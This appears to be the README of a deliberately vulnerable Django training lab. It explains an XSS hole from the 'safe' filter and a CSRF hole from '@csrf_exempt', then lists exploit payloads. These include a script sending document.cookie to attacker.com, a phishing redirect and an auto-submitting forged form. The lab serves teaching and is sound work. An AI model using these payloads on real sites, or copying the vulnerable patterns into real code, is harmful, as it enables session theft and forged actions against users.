# XSS and CSRF Vulnerabilities in a Django Application

## Description

This exercise demonstrates two critical web vulnerabilities within a Django-based web application:

1. **Cross-Site Scripting (XSS)** due to improper output escaping.
2. **Cross-Site Request Forgery (CSRF)** due to disabled CSRF protection.

---

## Vulnerabilities Details

### 1. Cross-Site Scripting (XSS)

- The application renders user-supplied input using the Django template syntax with the `safe` filter:

```django
{{ code|safe }}
```

- The safe filter disables Django's automatic escaping mechanism, allowing injected HTML or JavaScript to be rendered and executed directly in the browser.
- Impact: Attackers can inject malicious JavaScript into pages, steal cookies, perform actions on behalf of users, or manipulate site content.

### 2. Cross-Site Request Forgery (CSRF)

- The application uses the @csrf_exempt decorator on form-processing views:
```python
@csrf_exempt
def vulnerable_view(request):
    ...
```

- This disables Django’s built-in CSRF protection, allowing any site to craft and submit malicious requests on behalf of authenticated users.
- Impact: Attackers can force logged-in users to perform unintended actions like submitting forms, changing passwords, or making purchases.

## Exploitation Steps

### Exploiting XSS

Submit a payload via the vulnerable input field, for example:

```html
<script>alert('XSS');</script>
```

The script will be rendered and executed in the browser immediately because of the |safe filter.

More opportunities
```html
<img src=x onerror=alert(1)>
```

```html
<body onload=alert('XSS')>
```

### Example attack payloads:

```html
<script>fetch('http://attacker.com?c=' + document.cookie)</script>
```

```html
<script>window.location='http://phishing-site.com'</script>
```

### Exploiting CSRF

1. Craft a malicious HTML page that sends a POST request to the vulnerable Django view.

```html
<html>
  <body>
    <form action="http://victim-site.com/vulnerable-endpoint/" method="POST">
      <input type="hidden" name="data" value="Hacked">
      <input type="submit" value="Submit">
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
```

2. Trick a logged-in user into visiting the attacker's page.
3. The form will automatically submit and perform actions without the user’s knowledge.

## Why This is Dangerous

- XSS	Allows attackers to execute arbitrary scripts in the victim’s browser.
- CSRF	Allows attackers to perform state-changing actions on behalf of authenticated users.

Both vulnerabilities can lead to account compromise, sensitive data leakage, or full application takeover.

## Objective for Participants

- ✅ Successfully inject JavaScript via XSS.
- ✅ Successfully submit unauthorized requests via CSRF.
- ✅ Understand why output sanitization and CSRF protection are critical in modern web development.

## Mitigation Recommendations

- For XSS: Never use the safe filter unless absolutely necessary. Always validate and sanitize user inputs.
- For CSRF: Always enable CSRF protection and use Django’s built-in CSRF tokens in forms.

## Run

```commandline
python manage.py runserver
```